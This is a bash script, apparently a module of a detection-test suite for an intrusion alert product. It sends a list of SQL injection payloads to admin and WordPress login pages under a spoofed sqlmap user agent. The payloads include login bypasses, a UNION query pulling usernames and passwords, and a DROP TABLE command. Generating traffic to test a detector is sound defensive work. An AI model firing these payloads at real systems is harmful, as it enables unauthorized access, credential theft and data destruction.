#!/usr/bin/env bash
# Module 03: SQL Injection Probe
# Sends SQLi payloads to login/admin endpoints — triggers HIGH alert in IntruSense

TARGET_IP="${TARGET_IP:-$1}"
PORT="${TARGET_PORT:-8080}"
[[ -z "$TARGET_IP" ]] && { echo "TARGET_IP not set"; exit 1; }

BASE="http://$TARGET_IP:$PORT"
UA="sqlmap/1.7.8#stable (https://sqlmap.org)"

SQLI_PAYLOADS=(
  "' OR '1'='1"
  "' OR '1'='1' --"
  "admin'--"
  "' UNION SELECT 1,2,3 --"
  "' UNION SELECT null,username,password FROM users --"
  "1; DROP TABLE users --"
  "' OR 1=1 LIMIT 1 --"
  "') OR ('1'='1"
  "\" OR \"1\"=\"1"
  "' OR 'x'='x"
  "1' AND SLEEP(5) --"
  "' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects)) --"
)

echo "[03] Starting SQL Injection probes against $BASE"

for payload in "${SQLI_PAYLOADS[@]}"; do
  echo "[03] Testing: $payload"
  curl -s -o /dev/null \
    --connect-timeout 3 \
    -A "$UA" \
    -X POST \
    -d "username=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")&password=anything" \
    "$BASE/admin" 2>/dev/null || true

  curl -s -o /dev/null \
    --connect-timeout 3 \
    -A "$UA" \
    -X POST \
    -d "log=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))" 2>/dev/null || echo "$payload")&pwd=anything" \
    "$BASE/wp-login.php" 2>/dev/null || true

  sleep 0.4
done

echo "[03] SQL Injection probe complete — ${#SQLI_PAYLOADS[@]} payloads sent"
